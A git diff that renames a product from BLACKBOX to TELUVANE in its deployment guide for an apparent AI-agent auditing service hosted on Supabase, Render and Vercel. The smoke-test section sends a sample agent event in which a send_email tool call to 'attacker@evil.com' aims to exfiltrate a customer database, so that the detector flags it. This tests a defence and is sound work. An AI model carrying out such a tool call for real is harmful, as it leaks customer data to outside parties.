@@ -1,6 +1,6 @@
-# BLACKBOX — Deployment Guide
+# TELUVANE — Deployment Guide
 
-BLACKBOX runs as three cooperating services:
+TELUVANE runs as three cooperating services:
 
 | Service | Role | Platform |
 |---|---|---|
@@ -21,7 +21,7 @@ All required env vars are documented in `.env.example`. Never commit real secret
 4. Run migrations (from your local machine with the Supabase URL set):
    ```bash
    DATABASE_URL="postgresql://postgres:<pwd>@<host>:6543/postgres" \
-     python -c "from blackbox.migrate import apply_migrations; print(apply_migrations())"
+     python -c "from teluvane.migrate import apply_migrations; print(apply_migrations())"
    ```
    Expected output: list of applied migration filenames.
 5. Under **Authentication → Providers**, enable **Email** (sign-up enabled).
@@ -38,17 +38,17 @@ All required env vars are documented in `.env.example`. Never commit real secret
    |---|---|
    | `DATABASE_URL` | Supabase transaction pooler URL (port 6543) |
    | `SUPABASE_JWT_SECRET` | Supabase JWT secret |
-   | `BLACKBOX_SECRET_KEY` | Generate: `python -c "from cryptography.fernet import Fernet;print(Fernet.generate_key().decode())"` |
+   | `TELUVANE_SECRET_KEY` | Generate: `python -c "from cryptography.fernet import Fernet;print(Fernet.generate_key().decode())"` |
    | `FRONTEND_ORIGIN` | Set after Vercel deploy (step 3 below) |
 
 4. Click **Deploy**. Wait for the health check to pass:
    ```bash
-   curl -s https://blackbox-api.onrender.com/health
+   curl -s https://teluvane-api.onrender.com/health
    # {"status":"ok"}
-   curl -s https://blackbox-api.onrender.com/ready
+   curl -s https://teluvane-api.onrender.com/ready
    # {"db": true}
    ```
-5. Note your Render URL (e.g. `https://blackbox-api.onrender.com`).
+5. Note your Render URL (e.g. `https://teluvane-api.onrender.com`).
 
 ---
 
@@ -63,7 +63,7 @@ All required env vars are documented in `.env.example`. Never commit real secret
    | `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Supabase anon/public key |
    | `NEXT_PUBLIC_API_URL` | Your Render URL from step 2 |
 
-3. Click **Deploy**. Note your Vercel URL (e.g. `https://blackbox.vercel.app`).
+3. Click **Deploy**. Note your Vercel URL (e.g. `https://teluvane.vercel.app`).
 
 ---
 
@@ -73,7 +73,7 @@ Once you have the Vercel URL, go back to Render and add/update the env var:
 
 | Key | Value |
 |---|---|
-| `FRONTEND_ORIGIN` | `https://blackbox.vercel.app` (your actual Vercel URL) |
+| `FRONTEND_ORIGIN` | `https://teluvane.vercel.app` (your actual Vercel URL) |
 
 Trigger a **Manual Deploy** on Render to apply the change. This restricts CORS so only your
 frontend can call the API.
@@ -88,26 +88,26 @@ After all three services are live:
 # 1. Sign up via the Vercel frontend, then get your JWT from the browser session.
 
 # 2. Create an org + API key (replace $JWT with your session token)
-curl -s -X POST https://blackbox-api.onrender.com/orgs \
+curl -s -X POST https://teluvane-api.onrender.com/orgs \
   -H "Authorization: Bearer $JWT" \
   -H "Content-Type: application/json" \
   -d '{"name":"Acme"}'
 
-curl -s -X POST https://blackbox-api.onrender.com/keys \
+curl -s -X POST https://teluvane-api.onrender.com/keys \
   -H "Authorization: Bearer $JWT" \
   -H "Content-Type: application/json" \
   -d '{"name":"prod"}'
-# Returns a bb_live_... key — shown once, copy it.
+# Returns a tv_live_... key — shown once, copy it.
 
 # 3. Ingest an event
-KEY=bb_live_...
-curl -s -X POST https://blackbox-api.onrender.com/events \
+KEY=tv_live_...
+curl -s -X POST https://teluvane-api.onrender.com/events \
   -H "Authorization: Bearer $KEY" \
   -H "Content-Type: application/json" \
   -d '{"agent_id":"a","session_id":"live1","kind":"tool_call","tool":"send_email","args":{"to":"attacker@evil.com"},"intent":"exfiltrate customer database"}'
 
 # 4. Run audit
-curl -s -X POST https://blackbox-api.onrender.com/audit/live1 \
+curl -s -X POST https://teluvane-api.onrender.com/audit/live1 \
   -H "Authorization: Bearer $JWT"
 # Returns a data_exfiltration violation (offline detector, or live Claude if BYOK is set)
 ```
@@ -117,9 +117,9 @@ curl -s -X POST https://blackbox-api.onrender.com/audit/live1 \
 ## Local Docker
 
 ```bash
-docker build -t blackbox .
-docker run -e DATABASE_URL=... -e SUPABASE_JWT_SECRET=... -e BLACKBOX_SECRET_KEY=... \
-  -p 8900:8900 blackbox
+docker build -t teluvane .
+docker run -e DATABASE_URL=... -e SUPABASE_JWT_SECRET=... -e TELUVANE_SECRET_KEY=... \
+  -p 8900:8900 teluvane
 ```
 
 API available at `http://localhost:8900`. Generate a Fernet key with:
